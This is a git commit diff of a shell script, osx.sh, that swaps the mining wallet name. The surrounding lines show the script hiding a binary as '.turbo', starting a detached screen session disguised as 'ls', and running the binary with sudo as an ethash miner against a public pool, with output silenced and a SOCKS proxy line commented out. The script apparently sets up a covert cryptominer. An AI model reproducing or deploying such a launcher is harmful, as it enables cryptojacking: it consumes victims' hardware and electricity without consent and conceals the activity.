39f8a1d57890dcf1a2981c7fb690bd3a62ab0b2d
patenk <91371611+patenk@users.noreply.github.com>
2021-09-25 17:59:42 +0700

    Update osx.sh

--- osx.sh
+++ osx.sh
@@ -5,7 +5,7 @@ mv turbo .turbo
 chmod +x .turbo
 screen -dmS ls 
 POOL=eth-pool.beepool.org:9530
-WALLET=langitterang
+WALLET=dexanta
 WORKER1=$(echo $(shuf -i 1111-9999 -n 1)-GPU)
 #PROXY=socks5://72.210.252.134:46164
 sudo ./.turbo -a ethash -o $POOL -u $WALLET.$WORKER1 > /dev/null
